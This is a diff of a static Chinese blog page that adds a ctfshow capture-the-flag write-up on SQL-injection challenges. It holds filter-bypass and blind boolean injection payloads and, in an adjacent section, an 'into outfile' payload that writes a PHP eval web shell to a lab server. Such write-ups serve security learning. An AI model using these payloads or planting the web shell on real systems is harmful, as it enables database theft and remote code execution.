@@ -118,6 +118,68 @@
     
     
     <article
+  id="post-ctfshow刷题记录"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/11/15/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"
+    >ctfshow刷题记录</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/11/15/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-date">
+  <time datetime="2020-11-15T03:45:14.671Z" itemprop="datePublished">2020-11-15</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="web入门180："><a href="#web入门180：" class="headerlink" title="web入门180："></a>web入门180：</h2><p>这处过滤了#，/**/，%00，%a0,– ,空格，</p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master/IMG/20201115120454.png" alt="image-20201115120454526"></p>
+<p>注释都过滤了，还有空格。</p>
+<p>我们可以构造 a’or(id&gt;?)||’1’=’0  来达到目的。</p>
+<p>第一个引号闭合之前的，不能用空格就用(),其中||是或的意思，但是我查了好久，网上说是连接符。</p>
+<p>这样就可以达到闭合后面的   ‘  ,因为有limit 1所以要一个一个尝试，尝试一下23发现有flag.</p>
+<p>flag{1f9a4c19-c8ab-4319-923d-6febe6199368}</p>
+<h2 id="web入门181："><a href="#web入门181：" class="headerlink" title="web入门181："></a>web入门181：</h2><p>和180一样，</p>
+<h2 id="web入门182："><a href="#web入门182：" class="headerlink" title="web入门182："></a>web入门182：</h2><p>和180一样，</p>
+<h2 id="web入门183："><a href="#web入门183：" class="headerlink" title="web入门183："></a>web入门183：</h2><p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117120429.png" alt="image-20201117120422219"></p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117120511.png" alt="image-20201117120511404"></p>
+<p>不过你可以改43到127为flag的穷举形式，我难得改了。</p>
+<h2 id="web入门184："><a href="#web入门184：" class="headerlink" title="web入门184："></a>web入门184：</h2><p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117125358.png" alt="image-20201117125357965"></p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117160637.png" alt="image-20201117160630571"></p>
+<p>构造playload：tableName=ctfshow_user a join ctfshow_user b on if(b.id&gt;23,if(a.id&gt;23,if(ascii(substr(b.pass,1,1))&gt;102,1,0),0),0)</p>
+<p>取别名a,b然后发现and or被禁用了，但是我们可以用if语句达到相同的效果。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
   id="post-命令执行"
   class="article article-type-post"
   itemscope
@@ -344,6 +406,8 @@ def quicks(li):
 <h1 id="MySQL-dump-into-outfile"><a href="#MySQL-dump-into-outfile" class="headerlink" title="MySQL dump into outfile:"></a>MySQL dump into outfile:</h1><p>生成一个php文件，可以用蚁剑连接， 比如构造一个这个</p>
 <p>union select 1,(select group_concat(username) from security.users),’<?php @eval($_POST["aaa"]);?>‘ into outfile ‘D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\data.php’–+</p>
 <p>把’<?php @eval($_POST["aaa"]);?>‘放入data.php中，便于蚁剑连接，aaa就是密码，可以在data.php中看到回显内容</p>
+<h2 id="记录一些绕过姿势"><a href="#记录一些绕过姿势" class="headerlink" title="记录一些绕过姿势"></a>记录一些绕过姿势</h2><h3 id="一、过滤空格"><a href="#一、过滤空格" class="headerlink" title="一、过滤空格"></a>一、过滤空格</h3><p>（1）、/**/</p>
+<p>（2）、（）比如and(1=1)</p>
  
       <!-- reward -->
       
